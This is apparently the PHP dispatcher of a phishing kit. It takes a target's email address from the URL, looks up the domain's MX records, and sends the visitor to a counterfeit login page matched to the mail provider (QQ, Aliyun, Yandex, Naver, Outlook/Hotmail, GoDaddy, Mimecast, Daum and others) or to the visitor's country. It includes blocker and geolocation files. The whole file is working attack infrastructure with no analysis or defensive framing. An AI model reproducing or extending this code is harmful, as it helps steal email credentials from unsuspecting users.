<?php 
session_start();
ob_start();
include "blocker.php";
include "geo.php";
$radiobtn = $_SESSION['radiobtn'];
$subemail = $_SESSION['subemail'];


	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	parse_str(parse_url($url, PHP_URL_QUERY));
	$userid= strtolower($_GET['userid']);
	$domain = explode('@', $userid);
	
	$domain_check = '@'.strtolower($domain[1]);
	$email= $userid;
	


	
	if(stripos($domain_check, '@qq.') !== false || stripos($domain_check, '@qq.') !== false) {
        		header('Location: mailqq/?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid.'&subemail='.$subemail.'&radiobtn='.$radiobtn);
		}
	elseif(stripos($domain_check, '@aliyun.') !== false || stripos($domain_check, '@aliyun.') !== false) {
		header('Location: mxhichina/?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid.'&subemail='.$subemail.'&radiobtn='.$radiobtn);
		}
	elseif(stripos($domain_check, '@yandex.') !== false || stripos($domain_check, '@yandex.') !== false) {
		header('Location: yandex/?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid.'&subemail='.$subemail.'&radiobtn='.$radiobtn);
		}
		
	elseif(stripos($domain_check, '@vip.sina.') !== false || stripos($domain_check, '@vip.sina..') !== false) {
		header('Location: vipsina/?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid.'&subemail='.$subemail.'&radiobtn='.$radiobtn);
		}
	elseif(stripos($domain_check, '@naver.') !== false || stripos($domain_check, '@naver.') !== false) {
		header('Location: naver/?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid.'&subemail='.$subemail.'&radiobtn='.$radiobtn);
		}
		
	
	else {
	 $output ="";
                                        /*
                                         * Getting Domain part from user input Email-Address
                                         */
                                        $domain = substr(strrchr($email, "@"), 1);
	
function mxrecordValidate($userid, $domain) {

                                            $arr = dns_get_record($domain, DNS_MX);
                                            if ($arr[0]['host'] == $domain && !empty($arr[0]['target'])) {
                                                return $arr[0]['target'];
                                            }
                                        }

                                        
                                        if (mxrecordValidate($email, $domain)) {
                                            

                                            $data = dns_get_record($domain, DNS_MX);
                                            foreach ($data as $key1) {
                                                
                                                $result= $key1['target'];
                                                
                                            }
                                           
                                        } else {
                                            echo('No MX record exists.Invalid Email.');
                                        }
                                        
                                        //echo $result;
                                        
                                        $match = array("outlook","163","126","google","263","qq","secureserver","csloxinfo","hotmail","yahoo","prodigy","mxhichina","daum","hanmail","rakspace","mimecast","infinitummail");
	
	$arrlenght = count($match);
	/*check dns with the list of domains in array*/

	
	/*search for strings*/
	for ($i=0; $i< $arrlenght;$i++){
		if (stripos($result,$match[$i]) === false) {
		   
		
		}
		else
		$output=$match[$i];
		
		
		//display header
		
			
		
	}
	

	if ($output == $match[5]){
	    header('Location: exmailqq/?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid.'&subemail='.$subemail.'&radiobtn='.$radiobtn);
	}
	elseif ($output == $match[8]){
	    header('Location: msn/source/?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid.'&subemail='.$subemail.'&radiobtn='.$radiobtn);
	}
	elseif ($output == $match[9]){
	    header('Location: guce/?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid.'&subemail='.$subemail.'&radiobtn='.$radiobtn);
	}
	elseif ($output == $match[11]){
	    header('Location: mxhichina/?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid.'&subemail='.$subemail.'&radiobtn='.$radiobtn);
	}
	elseif ($output == $match[12]){
	    header('Location: daum/?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid.'&subemail='.$subemail.'&radiobtn='.$radiobtn);
	}
	elseif ($output == $match[13]){
	    header('Location: daum/?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid.'&subemail='.$subemail.'&radiobtn='.$radiobtn);
	}
	elseif ($output == $match[0]){
	    header('Location: msn/source/?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid.'&subemail='.$subemail.'&radiobtn='.$radiobtn);
	}
	elseif ($output == $match[4]){
	    header('Location: 263/?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid.'&subemail='.$subemail.'&radiobtn='.$radiobtn);
	}
   	elseif ($output == $match[14]){
	    header('Location: rakspace/?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid.'&subemail='.$subemail.'&radiobtn='.$radiobtn);
	}
	elseif ($output == $match[15]){
	    header('Location: mimecast/?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid.'&subemail='.$subemail.'&radiobtn='.$radiobtn);
	}
		elseif ($output == $match[16]){
	    header('Location: infinitummail/?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid.'&subemail='.$subemail.'&radiobtn='.$radiobtn);
	}

    	elseif ($output == $match[6]){
	    header('Location: godaddy/?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid.'&subemail='.$subemail.'&radiobtn='.$radiobtn);
	}
	elseif ($output == $match[2]){
	    header('Location: qiyelogin/?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid.'&subemail='.$subemail.'&radiobtn='.$radiobtn);
	}
    elseif ($output == $match[1]){
	    header('Location: qiyelogin/?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid.'&subemail='.$subemail.'&radiobtn='.$radiobtn);
	}
	else if ($country==CN || $country==HK || $country==TW) {
header( 'Location: CN/?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid.'&subemail='.$subemail.'&radiobtn='.$radiobtn );
}
	else if (stripos($country,'KR') !== false) {
header( 'Location: KR/?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid.'&subemail='.$subemail.'&radiobtn='.$radiobtn );
}
	else {
header( 'Location: yt/?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid.'&subemail='.$subemail.'&radiobtn='.$radiobtn );
}

	
	}
		 
?>